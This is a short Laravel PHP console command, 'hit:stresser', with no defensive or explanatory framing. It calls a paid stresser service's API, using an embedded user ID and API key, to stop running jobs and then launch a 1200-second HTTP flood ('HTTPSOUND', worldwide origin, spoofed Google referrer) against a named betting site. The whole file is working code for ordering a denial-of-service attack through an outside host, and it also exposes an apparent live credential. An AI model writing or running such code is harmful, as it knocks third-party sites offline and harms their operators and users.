<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class stresser extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'hit:stresser';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $stop = Http::get('https://api.stresser.su/stopall?user=1362760&api_key=fed5-82c64b86a1ec');


        if ($stop->ok()) {
            $start = Http::get('https://api.stresser.su/start?user=1362760&api_key=fed5-82c64b86a1ec&host=https://8xbet.kim=&time=1200&method=HTTPSOUND&origin=Worldwide&slots=2&referrer=https://google.com/');

            if ($start->ok()){
                $this->info('API hit successfully.');
            }

        } else {
            $this->error('Failed to hit API endpoint: '.$stop->status());
        }
    }
}
